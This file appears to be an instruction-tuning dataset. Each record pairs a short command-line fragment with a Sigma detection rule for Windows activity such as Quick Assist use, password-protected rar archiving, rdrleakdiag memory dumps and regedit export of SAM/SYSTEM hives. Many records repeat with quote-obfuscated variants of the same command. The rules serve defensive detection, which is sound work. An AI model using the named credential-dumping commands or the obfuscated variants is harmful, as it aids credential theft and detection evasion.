{"instruction": "Write Sigma rule to detect payload:", "input": "\\QuickAssist.exe", "output": "title: QuickAssist Execution\nid: e20b5b14-ce93-4230-88af-981983ef6e74\nstatus: experimental\ndescription: |\n    Detects the execution of Microsoft Quick Assist tool \"QuickAssist.exe\". This utility can be used by attackers to gain remote access.\nreferences:\n    - https://www.microsoft.com/en-us/security/blog/2024/05/15/threat-actors-misusing-quick-assist-in-social-engineering-attacks-leading-to-ransomware/\n    - https://www.linkedin.com/posts/kevin-beaumont-security_ive-been-assisting-a-few-orgs-hit-with-successful-activity-7268055739116445701-xxjZ/\n    - https://x.com/cyb3rops/status/1862406110365245506\n    - https://learn.microsoft.com/en-us/windows/client-management/client-tools/quick-assist\nauthor: Muhammad Faisal (@faisalusuf)\ndate: 2024-12-19\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\QuickAssist.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of Quick Assist in the environment.\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\"\\QuickAssist.exe\"", "output": "title: QuickAssist Execution\nid: e20b5b14-ce93-4230-88af-981983ef6e74\nstatus: experimental\ndescription: |\n    Detects the execution of Microsoft Quick Assist tool \"QuickAssist.exe\". This utility can be used by attackers to gain remote access.\nreferences:\n    - https://www.microsoft.com/en-us/security/blog/2024/05/15/threat-actors-misusing-quick-assist-in-social-engineering-attacks-leading-to-ransomware/\n    - https://www.linkedin.com/posts/kevin-beaumont-security_ive-been-assisting-a-few-orgs-hit-with-successful-activity-7268055739116445701-xxjZ/\n    - https://x.com/cyb3rops/status/1862406110365245506\n    - https://learn.microsoft.com/en-us/windows/client-management/client-tools/quick-assist\nauthor: Muhammad Faisal (@faisalusuf)\ndate: 2024-12-19\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\QuickAssist.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of Quick Assist in the environment.\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\QuickAssist", "output": "title: QuickAssist Execution\nid: e20b5b14-ce93-4230-88af-981983ef6e74\nstatus: experimental\ndescription: |\n    Detects the execution of Microsoft Quick Assist tool \"QuickAssist.exe\". This utility can be used by attackers to gain remote access.\nreferences:\n    - https://www.microsoft.com/en-us/security/blog/2024/05/15/threat-actors-misusing-quick-assist-in-social-engineering-attacks-leading-to-ransomware/\n    - https://www.linkedin.com/posts/kevin-beaumont-security_ive-been-assisting-a-few-orgs-hit-with-successful-activity-7268055739116445701-xxjZ/\n    - https://x.com/cyb3rops/status/1862406110365245506\n    - https://learn.microsoft.com/en-us/windows/client-management/client-tools/quick-assist\nauthor: Muhammad Faisal (@faisalusuf)\ndate: 2024-12-19\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\QuickAssist.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of Quick Assist in the environment.\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\QuickAssist.exe", "output": "title: QuickAssist Execution\nid: e20b5b14-ce93-4230-88af-981983ef6e74\nstatus: experimental\ndescription: |\n    Detects the execution of Microsoft Quick Assist tool \"QuickAssist.exe\". This utility can be used by attackers to gain remote access.\nreferences:\n    - https://www.microsoft.com/en-us/security/blog/2024/05/15/threat-actors-misusing-quick-assist-in-social-engineering-attacks-leading-to-ransomware/\n    - https://www.linkedin.com/posts/kevin-beaumont-security_ive-been-assisting-a-few-orgs-hit-with-successful-activity-7268055739116445701-xxjZ/\n    - https://x.com/cyb3rops/status/1862406110365245506\n    - https://learn.microsoft.com/en-us/windows/client-management/client-tools/quick-assist\nauthor: Muhammad Faisal (@faisalusuf)\ndate: 2024-12-19\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\QuickAssist.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of Quick Assist in the environment.\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-hp -m a", "output": "title: Rar Usage with Password and Compression Level\nid: faa48cae-6b25-4f00-a094-08947fef582f\nstatus: test\ndescription: Detects the use of rar.exe, on the command line, to create an archive with password protection or with a specific compression level. This is pretty indicative of malicious actions.\nreferences:\n    - https://labs.sentinelone.com/the-anatomy-of-an-apt-attack-and-cobaltstrike-beacons-encoded-configuration/\n    - https://ss64.com/bash/rar.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560.001/T1560.001.md\nauthor: '@ROxPinTeddy'\ndate: 2020-05-12\nmodified: 2022-03-16\ntags:\n    - attack.collection\n    - attack.t1560.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_password:\n        CommandLine|contains: ' -hp'\n    selection_other:\n        CommandLine|contains:\n            - ' -m'\n            - ' a '\n    condition: selection_password and selection_other\nfalsepositives:\n    - Legitimate use of Winrar command line version\n    - Other command line tools, that use these flags\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-hp \"-m\" a", "output": "title: Rar Usage with Password and Compression Level\nid: faa48cae-6b25-4f00-a094-08947fef582f\nstatus: test\ndescription: Detects the use of rar.exe, on the command line, to create an archive with password protection or with a specific compression level. This is pretty indicative of malicious actions.\nreferences:\n    - https://labs.sentinelone.com/the-anatomy-of-an-apt-attack-and-cobaltstrike-beacons-encoded-configuration/\n    - https://ss64.com/bash/rar.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560.001/T1560.001.md\nauthor: '@ROxPinTeddy'\ndate: 2020-05-12\nmodified: 2022-03-16\ntags:\n    - attack.collection\n    - attack.t1560.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_password:\n        CommandLine|contains: ' -hp'\n    selection_other:\n        CommandLine|contains:\n            - ' -m'\n            - ' a '\n    condition: selection_password and selection_other\nfalsepositives:\n    - Legitimate use of Winrar command line version\n    - Other command line tools, that use these flags\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-hp a -m", "output": "title: Rar Usage with Password and Compression Level\nid: faa48cae-6b25-4f00-a094-08947fef582f\nstatus: test\ndescription: Detects the use of rar.exe, on the command line, to create an archive with password protection or with a specific compression level. This is pretty indicative of malicious actions.\nreferences:\n    - https://labs.sentinelone.com/the-anatomy-of-an-apt-attack-and-cobaltstrike-beacons-encoded-configuration/\n    - https://ss64.com/bash/rar.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560.001/T1560.001.md\nauthor: '@ROxPinTeddy'\ndate: 2020-05-12\nmodified: 2022-03-16\ntags:\n    - attack.collection\n    - attack.t1560.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_password:\n        CommandLine|contains: ' -hp'\n    selection_other:\n        CommandLine|contains:\n            - ' -m'\n            - ' a '\n    condition: selection_password and selection_other\nfalsepositives:\n    - Legitimate use of Winrar command line version\n    - Other command line tools, that use these flags\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rar.exe a", "output": "title: Files Added To An Archive Using Rar.EXE\nid: 6f3e2987-db24-4c78-a860-b4f4095a7095\nstatus: test\ndescription: Detects usage of \"rar\" to add files to an archive for potential compression. An adversary may compress data (e.g. sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560.001/T1560.001.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/1ec33c93-3d0b-4a28-8014-dbdaae5c60ae.html\nauthor: Timur Zinniatullin, E.M. Anhaus, oscd.community\ndate: 2019-10-21\nmodified: 2023-02-05\ntags:\n    - attack.collection\n    - attack.t1560.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\rar.exe'\n        CommandLine|contains: ' a '\n    condition: selection\nfalsepositives:\n    - Highly likely if rar is a default archiver in the monitored environment.\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rar.exe \"a\"", "output": "title: Files Added To An Archive Using Rar.EXE\nid: 6f3e2987-db24-4c78-a860-b4f4095a7095\nstatus: test\ndescription: Detects usage of \"rar\" to add files to an archive for potential compression. An adversary may compress data (e.g. sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560.001/T1560.001.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/1ec33c93-3d0b-4a28-8014-dbdaae5c60ae.html\nauthor: Timur Zinniatullin, E.M. Anhaus, oscd.community\ndate: 2019-10-21\nmodified: 2023-02-05\ntags:\n    - attack.collection\n    - attack.t1560.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\rar.exe'\n        CommandLine|contains: ' a '\n    condition: selection\nfalsepositives:\n    - Highly likely if rar is a default archiver in the monitored environment.\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rar a", "output": "title: Files Added To An Archive Using Rar.EXE\nid: 6f3e2987-db24-4c78-a860-b4f4095a7095\nstatus: test\ndescription: Detects usage of \"rar\" to add files to an archive for potential compression. An adversary may compress data (e.g. sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560.001/T1560.001.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/1ec33c93-3d0b-4a28-8014-dbdaae5c60ae.html\nauthor: Timur Zinniatullin, E.M. Anhaus, oscd.community\ndate: 2019-10-21\nmodified: 2023-02-05\ntags:\n    - attack.collection\n    - attack.t1560.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\rar.exe'\n        CommandLine|contains: ' a '\n    condition: selection\nfalsepositives:\n    - Highly likely if rar is a default archiver in the monitored environment.\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rar.exe a", "output": "title: Files Added To An Archive Using Rar.EXE\nid: 6f3e2987-db24-4c78-a860-b4f4095a7095\nstatus: test\ndescription: Detects usage of \"rar\" to add files to an archive for potential compression. An adversary may compress data (e.g. sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560.001/T1560.001.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/1ec33c93-3d0b-4a28-8014-dbdaae5c60ae.html\nauthor: Timur Zinniatullin, E.M. Anhaus, oscd.community\ndate: 2019-10-21\nmodified: 2023-02-05\ntags:\n    - attack.collection\n    - attack.t1560.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\rar.exe'\n        CommandLine|contains: ' a '\n    condition: selection\nfalsepositives:\n    - Highly likely if rar is a default archiver in the monitored environment.\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "rasdial.exe", "output": "title: Suspicious RASdial Activity\nid: 6bba49bf-7f8c-47d6-a1bb-6b4dece4640e\nstatus: test\ndescription: Detects suspicious process related to rasdial.exe\nreferences:\n    - https://twitter.com/subTee/status/891298217907830785\nauthor: juju4\ndate: 2019-01-16\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: 'rasdial.exe'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "rasdial.exe", "output": "title: Suspicious RASdial Activity\nid: 6bba49bf-7f8c-47d6-a1bb-6b4dece4640e\nstatus: test\ndescription: Detects suspicious process related to rasdial.exe\nreferences:\n    - https://twitter.com/subTee/status/891298217907830785\nauthor: juju4\ndate: 2019-01-16\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: 'rasdial.exe'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "rasdial", "output": "title: Suspicious RASdial Activity\nid: 6bba49bf-7f8c-47d6-a1bb-6b4dece4640e\nstatus: test\ndescription: Detects suspicious process related to rasdial.exe\nreferences:\n    - https://twitter.com/subTee/status/891298217907830785\nauthor: juju4\ndate: 2019-01-16\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: 'rasdial.exe'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "rasdial.exe", "output": "title: Suspicious RASdial Activity\nid: 6bba49bf-7f8c-47d6-a1bb-6b4dece4640e\nstatus: test\ndescription: Detects suspicious process related to rasdial.exe\nreferences:\n    - https://twitter.com/subTee/status/891298217907830785\nauthor: juju4\ndate: 2019-01-16\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: 'rasdial.exe'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rdrleakdiag.exe RdrLeakDiag.exe /memdmp fullmemdmp /o /p", "output": "title: Process Memory Dump via RdrLeakDiag.EXE\nid: edadb1e5-5919-4e4c-8462-a9e643b02c4b\nrelated:\n    - id: 6355a919-2e97-4285-a673-74645566340d\n      type: obsolete\nstatus: test\ndescription: Detects the use of the Microsoft Windows Resource Leak Diagnostic tool \"rdrleakdiag.exe\" to dump process memory\nreferences:\n    - https://www.pureid.io/dumping-abusing-windows-credentials-part-1/\n    - https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/\n    - https://lolbas-project.github.io/lolbas/Binaries/Rdrleakdiag/\n    - https://twitter.com/0gtweet/status/1299071304805560321?s=21\n    - https://news.sophos.com/en-us/2024/06/05/operation-crimson-palace-a-technical-deep-dive\nauthor: Cedric MAURUGEON, Florian Roth (Nextron Systems), Swachchhanda Shrawan Poudel, Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-09-24\nmodified: 2024-08-15\ntags:\n    - attack.credential-access\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rdrleakdiag.exe'\n        - OriginalFileName: RdrLeakDiag.exe\n    selection_cli_dump:\n        CommandLine|contains|windash:\n            - '/memdmp'\n            - 'fullmemdmp'\n    selection_cli_output_process:\n        CommandLine|contains|windash:\n            - ' /o ' # Output\n            - ' /p ' # Process\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rdrleakdiag.exe \"R\"\"d\"\"r\"\"L\"\"e\"\"a\"\"k\"\"D\"\"i\"\"a\"\"g\"\".\"\"e\"\"x\"\"e\" /memdmp fullmemdmp /o /p", "output": "title: Process Memory Dump via RdrLeakDiag.EXE\nid: edadb1e5-5919-4e4c-8462-a9e643b02c4b\nrelated:\n    - id: 6355a919-2e97-4285-a673-74645566340d\n      type: obsolete\nstatus: test\ndescription: Detects the use of the Microsoft Windows Resource Leak Diagnostic tool \"rdrleakdiag.exe\" to dump process memory\nreferences:\n    - https://www.pureid.io/dumping-abusing-windows-credentials-part-1/\n    - https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/\n    - https://lolbas-project.github.io/lolbas/Binaries/Rdrleakdiag/\n    - https://twitter.com/0gtweet/status/1299071304805560321?s=21\n    - https://news.sophos.com/en-us/2024/06/05/operation-crimson-palace-a-technical-deep-dive\nauthor: Cedric MAURUGEON, Florian Roth (Nextron Systems), Swachchhanda Shrawan Poudel, Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-09-24\nmodified: 2024-08-15\ntags:\n    - attack.credential-access\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rdrleakdiag.exe'\n        - OriginalFileName: RdrLeakDiag.exe\n    selection_cli_dump:\n        CommandLine|contains|windash:\n            - '/memdmp'\n            - 'fullmemdmp'\n    selection_cli_output_process:\n        CommandLine|contains|windash:\n            - ' /o ' # Output\n            - ' /p ' # Process\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rdrleakdiag RdrLeakDiag /memdmp fullmemdmp /o /p", "output": "title: Process Memory Dump via RdrLeakDiag.EXE\nid: edadb1e5-5919-4e4c-8462-a9e643b02c4b\nrelated:\n    - id: 6355a919-2e97-4285-a673-74645566340d\n      type: obsolete\nstatus: test\ndescription: Detects the use of the Microsoft Windows Resource Leak Diagnostic tool \"rdrleakdiag.exe\" to dump process memory\nreferences:\n    - https://www.pureid.io/dumping-abusing-windows-credentials-part-1/\n    - https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/\n    - https://lolbas-project.github.io/lolbas/Binaries/Rdrleakdiag/\n    - https://twitter.com/0gtweet/status/1299071304805560321?s=21\n    - https://news.sophos.com/en-us/2024/06/05/operation-crimson-palace-a-technical-deep-dive\nauthor: Cedric MAURUGEON, Florian Roth (Nextron Systems), Swachchhanda Shrawan Poudel, Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-09-24\nmodified: 2024-08-15\ntags:\n    - attack.credential-access\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rdrleakdiag.exe'\n        - OriginalFileName: RdrLeakDiag.exe\n    selection_cli_dump:\n        CommandLine|contains|windash:\n            - '/memdmp'\n            - 'fullmemdmp'\n    selection_cli_output_process:\n        CommandLine|contains|windash:\n            - ' /o ' # Output\n            - ' /p ' # Process\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rdrleakdiag.exe RdrLeakDiag.exe /memdmp fullmemdmp /o /p", "output": "title: Process Memory Dump via RdrLeakDiag.EXE\nid: edadb1e5-5919-4e4c-8462-a9e643b02c4b\nrelated:\n    - id: 6355a919-2e97-4285-a673-74645566340d\n      type: obsolete\nstatus: test\ndescription: Detects the use of the Microsoft Windows Resource Leak Diagnostic tool \"rdrleakdiag.exe\" to dump process memory\nreferences:\n    - https://www.pureid.io/dumping-abusing-windows-credentials-part-1/\n    - https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/\n    - https://lolbas-project.github.io/lolbas/Binaries/Rdrleakdiag/\n    - https://twitter.com/0gtweet/status/1299071304805560321?s=21\n    - https://news.sophos.com/en-us/2024/06/05/operation-crimson-palace-a-technical-deep-dive\nauthor: Cedric MAURUGEON, Florian Roth (Nextron Systems), Swachchhanda Shrawan Poudel, Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-09-24\nmodified: 2024-08-15\ntags:\n    - attack.credential-access\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rdrleakdiag.exe'\n        - OriginalFileName: RdrLeakDiag.exe\n    selection_cli_dump:\n        CommandLine|contains|windash:\n            - '/memdmp'\n            - 'fullmemdmp'\n    selection_cli_output_process:\n        CommandLine|contains|windash:\n            - ' /o ' # Output\n            - ' /p ' # Process\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regedit.exe REGEDIT.EXE -E hklm hkey_local_machine", "output": "title: Exports Critical Registry Keys To a File\nid: 82880171-b475-4201-b811-e9c826cd5eaa\nrelated:\n    - id: f0e53e89-8d22-46ea-9db5-9d4796ee2f8a\n      type: similar\nstatus: test\ndescription: Detects the export of a crital Registry key to a file.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Regedit/\n    - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\nauthor: Oddvar Moe, Sander Wiebing, oscd.community\ndate: 2020-10-12\nmodified: 2024-03-13\ntags:\n    - attack.exfiltration\n    - attack.discovery\n    - attack.t1012\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regedit.exe'\n        - OriginalFileName: 'REGEDIT.EXE'\n    selection_cli_1:\n        CommandLine|contains|windash: ' -E '\n    selection_cli_2:\n        CommandLine|contains:\n            - 'hklm'\n            - 'hkey_local_machine'\n    selection_cli_3:\n        CommandLine|endswith:\n            - '\\system'\n            - '\\sam'\n            - '\\security'\n    condition: all of selection_*\nfields:\n    - ParentImage\n    - CommandLine\nfalsepositives:\n    - Dumping hives for legitimate purpouse i.e. backup or forensic investigation\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regedit.exe \\\"REGED\\\"IT.EXE -E hklm hkey_local_machine", "output": "title: Exports Critical Registry Keys To a File\nid: 82880171-b475-4201-b811-e9c826cd5eaa\nrelated:\n    - id: f0e53e89-8d22-46ea-9db5-9d4796ee2f8a\n      type: similar\nstatus: test\ndescription: Detects the export of a crital Registry key to a file.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Regedit/\n    - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\nauthor: Oddvar Moe, Sander Wiebing, oscd.community\ndate: 2020-10-12\nmodified: 2024-03-13\ntags:\n    - attack.exfiltration\n    - attack.discovery\n    - attack.t1012\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regedit.exe'\n        - OriginalFileName: 'REGEDIT.EXE'\n    selection_cli_1:\n        CommandLine|contains|windash: ' -E '\n    selection_cli_2:\n        CommandLine|contains:\n            - 'hklm'\n            - 'hkey_local_machine'\n    selection_cli_3:\n        CommandLine|endswith:\n            - '\\system'\n            - '\\sam'\n            - '\\security'\n    condition: all of selection_*\nfields:\n    - ParentImage\n    - CommandLine\nfalsepositives:\n    - Dumping hives for legitimate purpouse i.e. backup or forensic investigation\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regedit REGEDIT -E hklm hkey_local_machine", "output": "title: Exports Critical Registry Keys To a File\nid: 82880171-b475-4201-b811-e9c826cd5eaa\nrelated:\n    - id: f0e53e89-8d22-46ea-9db5-9d4796ee2f8a\n      type: similar\nstatus: test\ndescription: Detects the export of a crital Registry key to a file.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Regedit/\n    - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\nauthor: Oddvar Moe, Sander Wiebing, oscd.community\ndate: 2020-10-12\nmodified: 2024-03-13\ntags:\n    - attack.exfiltration\n    - attack.discovery\n    - attack.t1012\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regedit.exe'\n        - OriginalFileName: 'REGEDIT.EXE'\n    selection_cli_1:\n        CommandLine|contains|windash: ' -E '\n    selection_cli_2:\n        CommandLine|contains:\n            - 'hklm'\n            - 'hkey_local_machine'\n    selection_cli_3:\n        CommandLine|endswith:\n            - '\\system'\n            - '\\sam'\n            - '\\security'\n    condition: all of selection_*\nfields:\n    - ParentImage\n    - CommandLine\nfalsepositives:\n    - Dumping hives for legitimate purpouse i.e. backup or forensic investigation\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regedit.exe -E REGEDIT.EXE hkey_local_machine hklm", "output": "title: Exports Critical Registry Keys To a File\nid: 82880171-b475-4201-b811-e9c826cd5eaa\nrelated:\n    - id: f0e53e89-8d22-46ea-9db5-9d4796ee2f8a\n      type: similar\nstatus: test\ndescription: Detects the export of a crital Registry key to a file.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Regedit/\n    - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\nauthor: Oddvar Moe, Sander Wiebing, oscd.community\ndate: 2020-10-12\nmodified: 2024-03-13\ntags:\n    - attack.exfiltration\n    - attack.discovery\n    - attack.t1012\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regedit.exe'\n        - OriginalFileName: 'REGEDIT.EXE'\n    selection_cli_1:\n        CommandLine|contains|windash: ' -E '\n    selection_cli_2:\n        CommandLine|contains:\n            - 'hklm'\n            - 'hkey_local_machine'\n    selection_cli_3:\n        CommandLine|endswith:\n            - '\\system'\n            - '\\sam'\n            - '\\security'\n    condition: all of selection_*\nfields:\n    - ParentImage\n    - CommandLine\nfalsepositives:\n    - Dumping hives for legitimate purpouse i.e. backup or forensic investigation\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regedit.exe REGEDIT.EXE -E hklm hkey_local_machine", "output": "title: Exports Registry Key To a File\nid: f0e53e89-8d22-46ea-9db5-9d4796ee2f8a\nrelated:\n    - id: 82880171-b475-4201-b811-e9c826cd5eaa\n      type: similar\nstatus: test\ndescription: Detects the export of the target Registry key to a file.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Regedit/\n    - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\nauthor: Oddvar Moe, Sander Wiebing, oscd.community\ndate: 2020-10-07\nmodified: 2024-03-13\ntags:\n    - attack.exfiltration\n    - attack.discovery\n    - attack.t1012\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regedit.exe'\n        - OriginalFileName: 'REGEDIT.EXE'\n    selection_cli:\n        CommandLine|contains|windash: ' -E '\n    filter_1:   # filters to avoid intersection with critical keys rule\n        CommandLine|contains:\n            - 'hklm'\n            - 'hkey_local_machine'\n    filter_2:\n        CommandLine|endswith:\n            - '\\system'\n            - '\\sam'\n            - '\\security'\n    condition: all of selection_* and not all of filter_*\nfields:\n    - ParentImage\n    - CommandLine\nfalsepositives:\n    - Legitimate export of keys\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regedit.exe REGEDIT.EXE \"-E\" \"hklm\" hkey_local_machine", "output": "title: Exports Registry Key To a File\nid: f0e53e89-8d22-46ea-9db5-9d4796ee2f8a\nrelated:\n    - id: 82880171-b475-4201-b811-e9c826cd5eaa\n      type: similar\nstatus: test\ndescription: Detects the export of the target Registry key to a file.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Regedit/\n    - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\nauthor: Oddvar Moe, Sander Wiebing, oscd.community\ndate: 2020-10-07\nmodified: 2024-03-13\ntags:\n    - attack.exfiltration\n    - attack.discovery\n    - attack.t1012\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regedit.exe'\n        - OriginalFileName: 'REGEDIT.EXE'\n    selection_cli:\n        CommandLine|contains|windash: ' -E '\n    filter_1:   # filters to avoid intersection with critical keys rule\n        CommandLine|contains:\n            - 'hklm'\n            - 'hkey_local_machine'\n    filter_2:\n        CommandLine|endswith:\n            - '\\system'\n            - '\\sam'\n            - '\\security'\n    condition: all of selection_* and not all of filter_*\nfields:\n    - ParentImage\n    - CommandLine\nfalsepositives:\n    - Legitimate export of keys\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regedit REGEDIT -E hklm hkey_local_machine", "output": "title: Exports Registry Key To a File\nid: f0e53e89-8d22-46ea-9db5-9d4796ee2f8a\nrelated:\n    - id: 82880171-b475-4201-b811-e9c826cd5eaa\n      type: similar\nstatus: test\ndescription: Detects the export of the target Registry key to a file.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Regedit/\n    - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\nauthor: Oddvar Moe, Sander Wiebing, oscd.community\ndate: 2020-10-07\nmodified: 2024-03-13\ntags:\n    - attack.exfiltration\n    - attack.discovery\n    - attack.t1012\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regedit.exe'\n        - OriginalFileName: 'REGEDIT.EXE'\n    selection_cli:\n        CommandLine|contains|windash: ' -E '\n    filter_1:   # filters to avoid intersection with critical keys rule\n        CommandLine|contains:\n            - 'hklm'\n            - 'hkey_local_machine'\n    filter_2:\n        CommandLine|endswith:\n            - '\\system'\n            - '\\sam'\n            - '\\security'\n    condition: all of selection_* and not all of filter_*\nfields:\n    - ParentImage\n    - CommandLine\nfalsepositives:\n    - Legitimate export of keys\nlevel: low"}
